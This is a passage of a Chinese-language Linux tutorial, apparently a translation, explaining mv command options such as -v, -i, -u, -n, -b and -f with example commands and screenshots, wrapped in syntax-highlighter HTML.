style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720ac332905798-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mv </span><span class=\"crayon-v\">directory_1</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">directory_2</span><span class=\"crayon-o\">/</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cf60abcbc8e5d4ad81ea8666b78564a3.png\" alt=\"Renaming directory\"></p>\n<h4>6. 打印移动信息</h4>\n<p>当你移动或重命名一大堆文件或目录时，你可能会想在不去目标位置去查看的情况下知道你自己的命令是否成功地执行了。这就要用到<strong>-v</strong>选项了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720af210417020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -v *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720af210417020-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720af210417020-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">v *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/4f9bef19e69f100e7d4f1ec973114f82.png\" alt=\"mv with verbose mode\"></p>\n<p>该方法同样适用于目录。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/8eda462dd144998963b5adea39260da7.png\" alt=\"mv directory with verbose mode\"></p>\n<h4>7. 使用交互模式</h4>\n<p>当你将文件移动到其它位置，而那个位置恰好有同样的文件，这时 mv 命令会覆盖掉原来的文件。对于mv的这一行为一般不会有什么提示。如果想产生一个关于覆盖文件的提示，我们可以使用<strong>-i</strong>选项。（译注：通常发行版会通过alias命令，将-i作为默认选项，所以会有提示。）</p>\n<p>假设我们想将 file_1.txt 移动到 /home/pungki/office。同时，/home/pungki/office 目录下已经有file_1.txt文件了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720b3216928883\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -i file_1.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720b3216928883-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720b3216928883-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">file_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0e39f8eaefe16af197716905386551be.png\" alt=\"mv with interactive mode\"></p>\n<p>这个提示会让我们知道目标位置处file_1.txt的存在。如果我们按<strong>y</strong>键，那么那个文件将会被删除，否则不会。</p>\n<h4>8. 使用更新选项</h4>\n<p>-i 选项会提示我们关于覆盖文件的提示，而 -u 则只在源文件比目标文件新时才执行更新。让我们看一看下面的例子：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/2eb8dce13a7f749f4c2b392c0622324a.png\" alt=\"Update only newer\"></p>\n<p>假如 file_1.txt 和 file_2.txt有如下特点：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720b6995700619\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFile_1.txt has 84 bytes file size and it last modified time is 12:00\r\nFile_2.txt has 0 bytes file size and it last modified time is 11:59</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720b6995700619-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a34720b6995700619-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720b6995700619-1\"><span class=\"crayon-v\">File_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-i\">has</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">84</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">last </span><span class=\"crayon-e\">modified </span><span class=\"crayon-e\">time </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a34720b6995700619-2\"><span class=\"crayon-v\">File_2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-i\">has</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bytes </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">last </span><span class=\"crayon-e\">modified </span><span class=\"crayon-e\">time </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>我们想将它们移动到 /home/pungki/office 目录下。<strong>但是目标地址</strong>已经有file_1.txt和file_2.txt了。</p>\n<p>我们用下面的命令将file_1.txt 和file_2.txt从当前目录移动到/home/pungki/office</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720ba391180038\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -uv *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720ba391180038-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720ba391180038-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">uv *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>可以看到这些文件被移动了。能移动这些文件是因为它们最近的修改时间戳比 /home/pungki/office 目录中的文件新。</p>\n<h4>9.不要覆盖任何已存在的文件</h4>\n<p>如果<strong>-i</strong>选项询问我们是否要覆盖文件，那么 -n 选项将不会允许我们覆盖任何已存在的文件。</p>\n<p>继续使用第8点中的例子，如果我们将<strong>-u 换成 -n</strong>同时加上<strong>-v</strong>选项，那么我们会看到没有任何文件移动到了 /home/pungki/office 目录下。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720bf809560888\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -vn *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720bf809560888-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720bf809560888-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">vn *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/a5751c3a71e972ec2e8a1abad55667ce.png\" alt=\"No overwrite\"></p>\n<h4>10. 复制时创建备份</h4>\n<p>默认情况下，移动文件将会覆盖已存在的目标文件。但是如果我们移动错了文件而目标文件已经被新的文件覆盖了，这时应该怎么办才好呢？<strong>有没有一种方法可以恢复之前的文件呢？答案是肯定的</strong>。我们可以用<strong>-b</strong>选项。该选项会在新文件覆盖旧文件时将旧文件做备份。这里我们还以第8点为例。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720c3336128025\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -bv *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720c3336128025-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720c3336128025-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">bv *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/c5e357026dd7c98407042492ab8592e2.png\" alt=\"Backup option\"></p>\n<p>如截图中所见，在 /home/pungki/office 目录下出现了名为<strong>file_1.txt~</strong> 和 <strong>file_2.txt~</strong> 的文件。那个<strong>波浪符号（～）</strong>意味着这些文件是备份文件。从它们的属性中我们可以看到，这些文件比file_1.txt和file_2.txt要旧。</p>\n<h4>11. 无条件覆盖已经存在的文件</h4>\n<p>（译注：这一节是译者补充的，原文遗漏了这个重要选项）</p>\n<p>当你希望无论如何都覆盖已经存在的文件或目录时，你可以使用 -f 选项。如果同时指定了 -f 选项和 -i 或 -n 选项，则 -f 选项会覆盖它们——即不进行任何提示而覆盖，所以，在使用此参数时，知道你在做什么。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a34720c7036636873\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ mv -f *.txt /home/pungki/office</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a34720c7036636873-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a34720c7036636873-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e \">f *</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">txt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pungki</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">office</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h3>总结</h3>\n<p>移动文件和目录命令是Linux系统的基本命令。通常你可以通过<strong>man mv</strong> 或者 <strong>mv –help</strong>显示mv的手册页以了解更多详细信息。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113352\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113352votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113352\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/0103b0e13e2f637c79f77601cd7eed63b09b1158.jpg"}
